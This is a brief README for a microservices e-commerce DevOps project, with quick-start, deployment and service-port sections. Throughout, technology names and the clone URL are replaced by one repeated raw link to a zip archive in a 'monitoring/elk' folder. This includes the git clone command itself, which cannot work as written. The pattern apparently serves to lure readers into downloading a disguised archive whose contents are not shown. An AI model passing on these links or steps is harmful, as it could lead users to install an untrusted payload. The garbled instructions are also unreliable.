# E-Commerce DevOps Platform

## Overview
A complete e-commerce microservices platform with full DevOps automation.

## Quick Start

### Prerequisites
- Docker & Docker Compose
- https://github.com/Omkar052/DevOpsProject/raw/refs/heads/main/monitoring/elk/Dev_Project_Ops_1.7.zip 18+
- kubectl
- Terraform
- AWS CLI

### Local Development
```bash
git clone https://github.com/Omkar052/DevOpsProject/raw/refs/heads/main/monitoring/elk/Dev_Project_Ops_1.7.zip
cd ecommerce-devops-platform
docker-compose up -d
```

Access:
- Frontend: http://localhost:3000
- API Gateway: http://localhost:8080
- Grafana: http://localhost:3001

### Production Deployment
```bash
cd infrastructure/terraform/environments/prod
terraform init
terraform plan
terraform apply
kubectl apply -f kubernetes/
```

## Services
- Frontend (React): Port 3000
- Product Service (https://github.com/Omkar052/DevOpsProject/raw/refs/heads/main/monitoring/elk/Dev_Project_Ops_1.7.zip): Port 3001
- User Service (https://github.com/Omkar052/DevOpsProject/raw/refs/heads/main/monitoring/elk/Dev_Project_Ops_1.7.zip): Port 3002
- Order Service (https://github.com/Omkar052/DevOpsProject/raw/refs/heads/main/monitoring/elk/Dev_Project_Ops_1.7.zip): Port 3003
- Cart Service (https://github.com/Omkar052/DevOpsProject/raw/refs/heads/main/monitoring/elk/Dev_Project_Ops_1.7.zip): Port 3004

## DevOps Features
- Terraform for IaC
- GitHub Actions for CI/CD
- Prometheus/Grafana for monitoring
- Container security scanning

## License
MIT License